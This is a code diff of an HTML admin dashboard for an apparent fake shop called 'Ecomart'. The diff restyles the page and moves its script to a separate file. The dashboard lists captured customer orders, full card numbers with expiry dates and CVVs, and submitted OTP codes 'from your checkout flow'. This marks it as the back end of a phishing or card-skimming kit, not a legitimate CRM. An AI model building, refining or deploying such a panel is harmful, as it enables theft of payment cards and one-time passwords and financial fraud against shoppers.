@@ -3,754 +3,418 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CRM Dashboard - Ecomart</title>
+  <title>Ecomart CRM Dashboard</title>
   <link rel="stylesheet" href="css/style.css" />
   <style>
-    .crm-container {
-      max-width: 1200px;
-      margin: 10px auto;
-      padding: 15px;
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    :root {
+      --crm-bg: #f4f6fb;
+      --crm-panel: #ffffff;
+      --crm-border: #e2e8f0;
+      --crm-text: #1f2937;
+      --crm-muted: #64748b;
+      --crm-primary: #1d4ed8;
+      --crm-primary-hover: #1e40af;
+      --crm-success: #0f766e;
+      --crm-warn: #b45309;
+      --crm-danger: #b91c1c;
     }
-    
-    /* Mobile responsive */
-    @media (max-width: 768px) {
-      .crm-container {
-        margin: 5px;
-        padding: 10px;
-        border-radius: 8px;
-      }
+
+    body {
+      background: var(--crm-bg);
     }
-    .crm-header {
+
+    .crm-shell {
+      max-width: 1320px;
+      margin: 18px auto 24px;
+      padding: 0 14px;
+      color: var(--crm-text);
+    }
+
+    .crm-topbar {
       display: flex;
+      gap: 14px;
       justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-      padding-bottom: 15px;
-      border-bottom: 2px solid #f0f0f0;
+      align-items: flex-start;
+      margin-bottom: 14px;
       flex-wrap: wrap;
-      gap: 10px;
     }
-    
-    /* Mobile responsive header */
-    @media (max-width: 768px) {
-      .crm-header {
-        flex-direction: column;
-        align-items: stretch;
-        gap: 15px;
-      }
-    }
+
     .crm-title {
-      font-size: 24px;
-      font-weight: 700;
-      color: #212121;
+      margin: 0;
+      font-size: 30px;
+      font-weight: 800;
+      line-height: 1.2;
     }
+
+    .crm-subtitle {
+      margin: 4px 0 0;
+      color: var(--crm-muted);
+      font-size: 14px;
+    }
+
     .crm-controls {
       display: flex;
-      align-items: center;
-      gap: 10px;
       flex-wrap: wrap;
-    }
-    
-    /* Mobile responsive controls */
-    @media (max-width: 768px) {
-      .crm-controls {
-        justify-content: center;
-        gap: 8px;
-      }
-    }
-    .session-info {
-      font-size: 12px;
-      color: #878787;
-      padding: 4px 8px;
-      border-radius: 4px;
-      background: #f8f9fa;
-    }
-    .sync-status {
-      font-size: 12px;
-      color: #878787;
-      padding: 4px 8px;
-      border-radius: 4px;
-      background: #f8f9fa;
-    }
-    .sync-status.synced {
-      color: #388e3c;
-      background: #e8f5e8;
-    }
-    .sync-status.not-synced {
-      color: #f57c00;
-      background: #fff3e0;
-    }
-    .sync-btn {
-      background: #2874f0;
-      color: #fff;
-      border: none;
-      padding: 12px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-      font-size: 14px;
-      touch-action: manipulation;
-      min-height: 44px;
-      display: inline-flex;
       align-items: center;
-      justify-content: center;
+      gap: 8px;
+      justify-content: flex-end;
     }
-    
-    /* Mobile responsive buttons */
-    @media (max-width: 768px) {
-      .sync-btn {
-        padding: 10px 12px;
-        font-size: 12px;
-        min-height: 40px;
-        flex: 1;
-        min-width: 0;
-      }
+
+    .pill {
+      background: #eef2ff;
+      color: #334155;
+      border: 1px solid #dbeafe;
+      border-radius: 999px;
+      padding: 6px 10px;
+      font-size: 12px;
+      line-height: 1.2;
+      max-width: 320px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
-    .sync-btn:hover {
-      background: #1a8cff;
+
+    .sync-ok {
+      background: #ecfeff;
+      border-color: #99f6e4;
+      color: var(--crm-success);
     }
-    .sync-btn:disabled {
-      background: #ccc;
+
+    .sync-warn {
+      background: #fffbeb;
+      border-color: #fde68a;
+      color: var(--crm-warn);
+    }
+
+    .btn {
+      border: none;
+      border-radius: 8px;
+      padding: 10px 14px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+      color: #fff;
+      background: var(--crm-primary);
+      min-height: 38px;
+    }
+
+    .btn:hover {
+      background: var(--crm-primary-hover);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
       cursor: not-allowed;
     }
-    .export-btn {
-      background: #2874f0;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
+
+    .btn-neutral {
+      background: #475569;
     }
-    .export-btn:hover {
-      background: #1a8cff;
+
+    .btn-neutral:hover {
+      background: #334155;
     }
-    .logout-btn {
-      background: #dc3545;
-      color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-      font-size: 12px;
+
+    .btn-danger {
+      background: var(--crm-danger);
     }
-    .logout-btn:hover {
-      background: #c82333;
+
+    .btn-danger:hover {
+      background: #991b1b;
     }
-    .stats-container {
+
+    .stats-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 15px;
-      margin-bottom: 20px;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+      margin-bottom: 12px;
     }
-    
-    /* Mobile responsive stats */
-    @media (max-width: 768px) {
-      .stats-container {
-        grid-template-columns: repeat(2, 1fr);
-        gap: 10px;
-        margin-bottom: 15px;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .stats-container {
-        grid-template-columns: 1fr;
-        gap: 8px;
-      }
-    }
+
     .stat-card {
-      background: #f8f9fa;
-      padding: 20px;
-      border-radius: 8px;
-      border-left: 4px solid #2874f0;
-    }
-    .stat-number {
-      font-size: 28px;
-      font-weight: 700;
-      color: #2874f0;
-    }
-    .stat-label {
-      font-size: 14px;
-      color: #878787;
-      margin-top: 5px;
-    }
-    .table-container {
-      background: #fff;
-      border-radius: 8px;
-      overflow-x: auto;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    
-    /* Mobile responsive table container */
-    @media (max-width: 768px) {
-      .table-container {
-        border-radius: 6px;
-        overflow-x: scroll;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .table-container {
-        border-radius: 4px;
-        overflow-x: scroll;
-      }
-    }
-    .table-header {
-      background: #f8f9fa;
-      padding: 15px;
-      border-bottom: 2px solid #e9ecef;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .table-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #212121;
-    }
-    .data-table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-    
-    /* Mobile responsive tables */
-    @media (max-width: 768px) {
-      .data-table {
-        font-size: 12px;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .data-table {
-        font-size: 11px;
-      }
-    }
-    .data-table th,
-    .data-table td {
-      padding: 12px;
-      text-align: left;
-      border-bottom: 1px solid #e9ecef;
-    }
-    .data-table th {
-      background: #f8f9fa;
-      font-weight: 600;
-      color: #495057;
-      font-size: 14px;
-    }
-    .data-table td {
-      font-size: 13px;
-      color: #212121;
-      word-wrap: break-word;
-    }
-    
-    /* Mobile responsive table cells */
-    @media (max-width: 768px) {
-      .data-table td {
-        padding: 8px;
-        font-size: 11px;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .data-table td {
-        padding: 6px;
-        font-size: 10px;
-      }
-    }
-    .status-badge {
-      padding: 4px 8px;
+      background: var(--crm-panel);
+      border: 1px solid var(--crm-border);
       border-radius: 12px;
-      font-size: 11px;
-      font-weight: 500;
+      padding: 14px;
     }
-    .status-success {
-      background: #d4edda;
-      color: #155724;
+
+    .stat-label {
+      color: var(--crm-muted);
+      font-size: 12px;
+      margin-bottom: 8px;
     }
+
+    .stat-value {
+      font-size: 30px;
+      font-weight: 800;
+      line-height: 1;
+      color: var(--crm-primary);
+    }
+
+    .panel {
+      background: var(--crm-panel);
+      border: 1px solid var(--crm-border);
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .panel-header {
+      padding: 12px;
+      border-bottom: 1px solid var(--crm-border);
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+
     .tabs {
       display: flex;
-      gap: 8px;
-      margin-bottom: 20px;
-      border-bottom: 2px solid #e9ecef;
-      overflow-x: auto;
-      white-space: nowrap;
+      gap: 6px;
+      flex-wrap: wrap;
     }
-    
-    /* Mobile responsive tabs */
-    @media (max-width: 768px) {
-      .tabs {
-        gap: 5px;
-        margin-bottom: 15px;
-      }
-    }
-    
-    @media (max-width: 480px) {
-      .tabs {
-        gap: 3px;
-        margin-bottom: 10px;
-      }
-    }
-    .tab {
-      padding: 12px 16px;
-      background: none;
-      border: none;
+
+    .tab-btn {
+      border: 1px solid var(--crm-border);
+      background: #f8fafc;
+      color: #334155;
+      border-radius: 8px;
+      padding: 8px 12px;
+      font-size: 13px;
+      font-weight: 700;
       cursor: pointer;
-      font-weight: 500;
-      color: #878787;
-      border-bottom: 2px solid transparent;
-      touch-action: manipulation;
-      min-height: 44px;
-      white-space: nowrap;
-      font-size: 14px;
     }
-    
-    /* Mobile responsive tabs */
-    @media (max-width: 768px) {
-      .tab {
-        padding: 8px 12px;
-        font-size: 12px;
-        min-height: 40px;
-      }
+
+    .tab-btn.active {
+      background: #dbeafe;
+      border-color: #93c5fd;
+      color: #1e3a8a;
     }
-    
-    @media (max-width: 480px) {
-      .tab {
-        padding: 6px 8px;
-        font-size: 11px;
-        min-height: 36px;
-      }
+
+    .panel-tools {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      flex-wrap: wrap;
     }
-    .tab.active {
-      color: #2874f0;
-      border-bottom-color: #2874f0;
+
+    .search-input {
+      min-width: 260px;
+      max-width: 320px;
+      width: 100%;
+      border: 1px solid var(--crm-border);
+      border-radius: 8px;
+      padding: 9px 11px;
+      font-size: 13px;
+      color: #0f172a;
     }
-    .tab-content {
+
+    .search-input:focus {
+      outline: 2px solid #bfdbfe;
+      border-color: #93c5fd;
+    }
+
+    .panel-body {
+      padding: 0;
+    }
+
+    .table-wrap {
+      overflow-x: auto;
       display: none;
     }
-    .tab-content.active {
+
+    .table-wrap.active {
       display: block;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+    }
+
+    th,
+    td {
+      text-align: left;
+      padding: 10px 10px;
+      border-bottom: 1px solid var(--crm-border);
+      vertical-align: top;
+      white-space: nowrap;
+    }
+
+    th {
+      background: #f8fafc;
+      color: #334155;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 0.2px;
+      position: sticky;
+      top: 0;
+      z-index: 1;
+    }
+
+    .cell-wrap {
+      white-space: normal;
+      min-width: 260px;
+      max-width: 460px;
+    }
+
+    .status-chip {
+      display: inline-block;
+      border-radius: 999px;
+      padding: 4px 8px;
+      font-size: 11px;
+      font-weight: 700;
+      background: #ecfeff;
+      color: #0f766e;
+      border: 1px solid #99f6e4;
+    }
+
+    .empty-state {
+      padding: 26px;
+      color: var(--crm-muted);
+      text-align: center;
+      font-size: 14px;
+    }
+
+    @media (max-width: 1100px) {
+      .stats-grid {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+    }
+
+    @media (max-width: 740px) {
+      .crm-title {
+        font-size: 24px;
+      }
+
+      .crm-controls {
+        justify-content: flex-start;
+      }
+
+      .search-input {
+        min-width: 100%;
+        max-width: 100%;
+      }
+
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+
+      th,
+      td {
+        font-size: 12px;
+        padding: 9px 8px;
+      }
     }
   </style>
 </head>
 <body>
-
 <div id="header"></div>
-<div class="crm-container">
-  <!-- Header -->
-  <div class="crm-header">
-    <div class="crm-title">ð CRM Dashboard</div>
+
+<main class="crm-shell">
+  <header class="crm-topbar">
+    <div>
+      <h1 class="crm-title">Ecomart CRM</h1>
+      <p class="crm-subtitle">Orders, card details, and OTP logs from your checkout flow</p>
+    </div>
     <div class="crm-controls">
-      <div class="session-info" id="session-info">Loading...</div>
-      <div class="sync-status" id="sync-status">Checking sync...</div>
-      <button class="sync-btn" id="sync-btn" onclick="manualSync()">ð Sync Cross-Device</button>
-      <button class="sync-btn" id="force-refresh-btn" onclick="forceRefresh()" style="background: #ff6b35;">ð Force Refresh</button>
-      <button class="sync-btn" id="data-refresh-btn" onclick="refreshData()" style="background: #17a2b8;">ð Fix Data</button>
-      <button class="export-btn" onclick="exportData()">ð¥ Export Data</button>
-      <button class="logout-btn" id="logout-btn">ð Logout</button>
+      <div class="pill" id="session-info">Loading session...</div>
+      <div class="pill sync-warn" id="sync-status">Loading CRM status...</div>
+      <button class="btn btn-neutral" id="refresh-btn" type="button">Refresh</button>
+      <button class="btn" id="force-refresh-btn" type="button">Force Refresh</button>
+      <button class="btn" id="export-btn" type="button">Export JSON</button>
+      <button class="btn btn-danger" id="logout-btn" type="button">Logout</button>
     </div>
-  </div>
+  </header>
 
-  <!-- Statistics -->
-  <div class="stats-container">
-    <div class="stat-card">
-      <div class="stat-number" id="total-orders">0</div>
+  <section class="stats-grid">
+    <article class="stat-card">
       <div class="stat-label">Total Orders</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-number" id="total-cards">0</div>
-      <div class="stat-label">Card Details</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-number" id="total-otp">0</div>
-      <div class="stat-label">OTP Verifications</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-number" id="success-rate">0%</div>
-      <div class="stat-label">Success Rate</div>
-    </div>
-  </div>
+      <div class="stat-value" id="stat-orders">0</div>
+    </article>
+    <article class="stat-card">
+      <div class="stat-label">Card Entries</div>
+      <div class="stat-value" id="stat-cards">0</div>
+    </article>
+    <article class="stat-card">
+      <div class="stat-label">OTP Entries</div>
+      <div class="stat-value" id="stat-otp">0</div>
+    </article>
+    <article class="stat-card">
+      <div class="stat-label">Last Update</div>
+      <div class="stat-value" id="stat-last" style="font-size:15px;line-height:1.3;color:#0f172a;">-</div>
+    </article>
+  </section>
 
-  <!-- Tabs -->
-  <div class="tabs">
-    <button class="tab active" onclick="showTab('orders')">Orders</button>
-    <button class="tab" onclick="showTab('cards')">Card Details</button>
-    <button class="tab" onclick="showTab('otp')">OTP Data</button>
-  </div>
-
-  <!-- Orders Tab -->
-  <div id="orders-tab" class="tab-content active">
-    <div class="table-container">
-      <div class="table-header">
-        <div class="table-title">ð Order History</div>
+  <section class="panel">
+    <div class="panel-header">
+      <div class="tabs" role="tablist" aria-label="CRM Tabs">
+        <button class="tab-btn active" data-tab="orders" type="button">Orders</button>
+        <button class="tab-btn" data-tab="cards" type="button">Cards</button>
+        <button class="tab-btn" data-tab="otp" type="button">OTP</button>
       </div>
-      <table class="data-table">
-        <thead>
-          <tr>
-            <th>Date & Time</th>
-            <th>Name</th>
-            <th>Email</th>
-            <th>Phone</th>
-            <th>Order Total</th>
-            <th>Store Details</th>
-            <th>Status</th>
-          </tr>
-        </thead>
-        <tbody id="orders-tbody">
-          <!-- Orders will be populated here -->
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- Card Details Tab -->
-  <div id="cards-tab" class="tab-content">
-    <div class="table-container">
-      <div class="table-header">
-        <div class="table-title">ð Card Details</div>
+      <div class="panel-tools">
+        <input class="search-input" id="search-input" type="text" placeholder="Search current tab..." />
       </div>
-      <table class="data-table">
-        <thead>
-          <tr>
-            <th>Date & Time</th>
-            <th>Name on Card</th>
-            <th>Card Number</th>
-            <th>Expiry</th>
-            <th>CVV</th>
-            <th>Status</th>
-          </tr>
-        </thead>
-        <tbody id="cards-tbody">
-          <!-- Card details will be populated here -->
-        </tbody>
-      </table>
     </div>
-  </div>
 
-  <!-- OTP Tab -->
-  <div id="otp-tab" class="tab-content">
-    <div class="table-container">
-      <div class="table-header">
-        <div class="table-title">ð OTP Verifications</div>
+    <div class="panel-body">
+      <div class="table-wrap active" id="tab-orders">
+        <table>
+          <thead>
+            <tr>
+              <th>Date & Time</th>
+              <th>Name</th>
+              <th>Email</th>
+              <th>Phone</th>
+              <th>Total</th>
+              <th>Store Details</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="orders-body"></tbody>
+        </table>
       </div>
-      <table class="data-table">
-        <thead>
-          <tr>
-            <th>Date & Time</th>
-            <th>Submitted OTP</th>
-            <th>Email</th>
-            <th>Phone</th>
-            <th>Status</th>
-          </tr>
-        </thead>
-        <tbody id="otp-tbody">
-          <!-- OTP data will be populated here -->
-        </tbody>
-      </table>
+
+      <div class="table-wrap" id="tab-cards">
+        <table>
+          <thead>
+            <tr>
+              <th>Date & Time</th>
+              <th>Name</th>
+              <th>Card Number</th>
+              <th>Expiry</th>
+              <th>CVV</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="cards-body"></tbody>
+        </table>
+      </div>
+
+      <div class="table-wrap" id="tab-otp">
+        <table>
+          <thead>
+            <tr>
+              <th>Date & Time</th>
+              <th>OTP</th>
+              <th>Email</th>
+              <th>Phone</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="otp-body"></tbody>
+        </table>
+      </div>
     </div>
-  </div>
-</div>
+  </section>
+</main>
 
 <div id="footer"></div>
 
 <script src="js/data.js"></script>
 <script src="js/auth.js"></script>
 <script src="js/crm-customer-flow.js"></script>
-<script>
-  document.getElementById("header").innerHTML = renderHeader();
-  document.getElementById("footer").innerHTML = renderFooter();
-
-  // Get CRM data from the customer flow system
-  async function getCRMData() {
-    return window.customerCRMFlow.getCRMData();
-  }
-
-  const CRM_STORAGE_KEY = 'crm_customer_data';
-  const LEGACY_CRM_STORAGE_KEYS = ['crmData', 'crm_data_cross_device', 'crm_data_hybrid', 'crm_data_v2'];
-  const FAST_REFRESH_MS = 500;
-  const CLOUD_SYNC_MS = 5000;
-  let lastCRMDataSignature = '';
-  let fastRefreshTimer = null;
-  let cloudSyncTimer = null;
-
-  function formatOrderDetails(order) {
-    const details = [];
-    if (order.items) details.push(order.items);
-
-    const location = [order.city, order.state, order.pincode].filter(Boolean).join(', ');
-    if (location) details.push(location);
-
-    if (order.addressType) details.push('Type: ' + order.addressType);
-    if (order.address) details.push(order.address);
-
-    return details.length ? details.join(' | ') : 'N/A';
-  }
-
-  function isLocalMode(diagnostics) {
-    const outcome = String((diagnostics && diagnostics.outcome) || '');
-    return outcome.includes('local') && outcome !== 'cloud_synced';
-  }
-
-  // Update statistics
-  async function updateCRMStats() {
-    const stats = window.customerCRMFlow.getCRMStats();
-    const diagnostics = window.customerCRMFlow.getSyncDiagnostics ? window.customerCRMFlow.getSyncDiagnostics() : null;
-    document.getElementById('total-orders').textContent = stats.totalOrders;
-    document.getElementById('total-cards').textContent = stats.totalCards;
-    document.getElementById('total-otp').textContent = stats.totalOTP;
-    document.getElementById('success-rate').textContent = stats.successRate + '%';
-    
-    // Update sync status
-    const syncStatus = document.getElementById('sync-status');
-    if (syncStatus) {
-      if (stats.isOnline) {
-        if (isLocalMode(diagnostics)) {
-          syncStatus.textContent = 'Local sync active (cloud unavailable)';
-          syncStatus.className = 'sync-status not-synced';
-        } else {
-          syncStatus.textContent = 'Customer data active: ' + new Date(stats.lastSync).toLocaleString();
-          syncStatus.className = 'sync-status synced';
-        }
-      } else {
-        syncStatus.textContent = 'Offline';
-        syncStatus.className = 'sync-status not-synced';
-      }
-    }
-  }
-
-  // Render tables
-  async function renderCRMTables() {
-    const crmData = await getCRMData();
-    
-    // Render orders
-    const ordersTbody = document.getElementById('orders-tbody');
-    ordersTbody.innerHTML = crmData.orders.map(order => `
-      <tr>
-        <td>${new Date(order.timestamp).toLocaleString()}</td>
-        <td>${order.fullName}</td>
-        <td>${order.email}</td>
-        <td>${order.phone}</td>
-        <td>Rs${order.orderTotal}</td>
-        <td>${formatOrderDetails(order)}</td>
-        <td><span class="status-badge status-success">${order.status}</span></td>
-      </tr>
-    `).join('');
-
-    // Render card details
-    const cardsTbody = document.getElementById('cards-tbody');
-    cardsTbody.innerHTML = crmData.cards.map(card => `
-      <tr>
-        <td>${new Date(card.timestamp).toLocaleString()}</td>
-        <td>${card.cardName}</td>
-        <td>${card.cardNumber}</td>
-        <td>${card.expiry}</td>
-        <td>${card.cvv}</td>
-        <td><span class="status-badge status-success">${card.status}</span></td>
-      </tr>
-    `).join('');
-
-    // Render OTP data
-    const otpTbody = document.getElementById('otp-tbody');
-    otpTbody.innerHTML = crmData.otp.map(otp => `
-      <tr>
-        <td>${new Date(otp.timestamp).toLocaleString()}</td>
-        <td>${otp.submittedOTP}</td>
-        <td>${otp.email}</td>
-        <td>${otp.phone}</td>
-        <td><span class="status-badge status-success">${otp.status}</span></td>
-      </tr>
-    `).join('');
-  }
-
-  // Manual sync function
-  async function manualSync() {
-    const syncBtn = document.getElementById('sync-btn');
-    syncBtn.textContent = 'Syncing...';
-    syncBtn.disabled = true;
-    
-    try {
-      const synced = await window.crossDeviceCRMSync.syncFromCloud();
-      const diagnostics = window.customerCRMFlow.getSyncDiagnostics ? window.customerCRMFlow.getSyncDiagnostics() : null;
-      if (synced) {
-        await updateCRMStats();
-        await renderCRMTables();
-        if (isLocalMode(diagnostics)) {
-          alert('Local CRM refreshed. Cloud sync is currently unavailable.');
-        } else {
-          alert('Cross-device data synced successfully!');
-        }
-      } else {
-        await updateCRMStats();
-        await renderCRMTables();
-        alert('Data refreshed locally. Cloud sync could not be reached.');
-      }
-    } catch (error) {
-      console.error('Cross-device sync error:', error);
-      alert('Cross-device sync failed. Please try again.');
-    } finally {
-      syncBtn.textContent = 'Sync Cross-Device';
-      syncBtn.disabled = false;
-    }
-  }
-
-  // Tab switching
-  function showTab(tabName) {
-    // Hide all tabs
-    document.querySelectorAll('.tab-content').forEach(tab => {
-      tab.classList.remove('active');
-    });
-    document.querySelectorAll('.tab').forEach(tab => {
-      tab.classList.remove('active');
-    });
-
-    // Show selected tab
-    document.getElementById(tabName + '-tab').classList.add('active');
-    event.target.classList.add('active');
-  }
-
-  // Export data
-  function exportData() {
-    window.cloudCRMStorage.exportData();
-  }
-
-  // Force refresh function
-  async function forceRefresh() {
-    const refreshBtn = document.getElementById('force-refresh-btn');
-    refreshBtn.textContent = 'Forcing...';
-    refreshBtn.disabled = true;
-    
-    try {
-      const refreshed = await window.forceCRMRefresh();
-      const diagnostics = window.customerCRMFlow.getSyncDiagnostics ? window.customerCRMFlow.getSyncDiagnostics() : null;
-      await updateCRMStats();
-      await renderCRMTables();
-
-      if (refreshed) {
-        if (isLocalMode(diagnostics)) {
-          alert('Force refresh completed in local mode. Cloud sync is unavailable right now.');
-        } else {
-          alert('Force refresh completed! Old data should now be updated.');
-        }
-      } else {
-        alert('Refresh could not load data. Please place one test order and try again.');
-      }
-    } catch (error) {
-      console.error('Force refresh error:', error);
-      alert('Force refresh failed. Please try again.');
-    } finally {
-      refreshBtn.textContent = 'Force Refresh';
-      refreshBtn.disabled = false;
-    }
-  }
-
-  // Refresh data function
-  async function refreshData() {
-    const refreshBtn = document.getElementById('data-refresh-btn');
-    refreshBtn.textContent = 'Fixing...';
-    refreshBtn.disabled = true;
-    
-    try {
-      await window.refreshCRMData();
-      await updateCRMStats();
-      await renderCRMTables();
-      alert('Data fixed! Sample data loaded and tables refreshed.');
-    } catch (error) {
-      console.error('Data refresh error:', error);
-      alert('Data refresh failed. Please try again.');
-    } finally {
-      refreshBtn.textContent = 'Fix Data';
-      refreshBtn.disabled = false;
-    }
-  }
-
-  // Initialize and auto-refresh
-  async function initializeCRM() {
-    console.log('CRM: Initializing customer data dashboard...');
-    
-    // Ensure customer data is initialized
-    const data = window.customerCRMFlow.getCRMData();
-    console.log('CRM: Customer data loaded:', {
-      orders: data.orders.length,
-      cards: data.cards.length,
-      otp: data.otp.length
-    });
-    
-    // Update UI with data immediately
-    await refreshDashboardIfChanged(true);
-    
-    console.log('CRM: Customer data dashboard initialized');
-  }
-
-  async function refreshDashboardIfChanged(forceUpdate = false) {
-    if (window.customerCRMFlow && typeof window.customerCRMFlow.migrateLegacyLocalData === 'function') {
-      window.customerCRMFlow.migrateLegacyLocalData();
-    }
-
-    const currentSignature = localStorage.getItem(CRM_STORAGE_KEY) || '';
-    if (!forceUpdate && currentSignature === lastCRMDataSignature) {
-      return;
-    }
-
-    lastCRMDataSignature = currentSignature;
-    await updateCRMStats();
-    await renderCRMTables();
-  }
-
-  function startFastRefresh() {
-    if (fastRefreshTimer) {
-      clearInterval(fastRefreshTimer);
-    }
-
-    fastRefreshTimer = setInterval(async () => {
-      await refreshDashboardIfChanged();
-    }, FAST_REFRESH_MS);
-  }
-
-  async function autoCloudSyncAndRefresh() {
-    if (window.crossDeviceCRMSync && typeof window.crossDeviceCRMSync.syncFromCloud === 'function') {
-      await window.crossDeviceCRMSync.syncFromCloud();
-    }
-    await refreshDashboardIfChanged();
-  }
-
-  function startAutoCloudSync() {
-    if (cloudSyncTimer) {
-      clearInterval(cloudSyncTimer);
-    }
-
-    cloudSyncTimer = setInterval(async () => {
-      await autoCloudSyncAndRefresh();
-    }, CLOUD_SYNC_MS);
-  }
-
-  // Instant refresh when orders are updated in another tab/window
-  window.addEventListener('storage', async (event) => {
-    if (event.key === CRM_STORAGE_KEY || LEGACY_CRM_STORAGE_KEYS.includes(event.key)) {
-      await refreshDashboardIfChanged(true);
-    }
-  });
-
-  // Initialize on page load
-  document.addEventListener('DOMContentLoaded', async () => {
-    // Wait a moment for sync system to initialize
-    setTimeout(async () => {
-      await initializeCRM();
-      startFastRefresh();
-      startAutoCloudSync();
-    }, 500);
-  });
-
-  // Pull latest cloud data whenever tab becomes active again
-  document.addEventListener('visibilitychange', async () => {
-    if (!document.hidden) {
-      await autoCloudSyncAndRefresh();
-    }
-  });
-</script>
+<script src="js/crm-dashboard.js"></script>
 </body>
 </html>
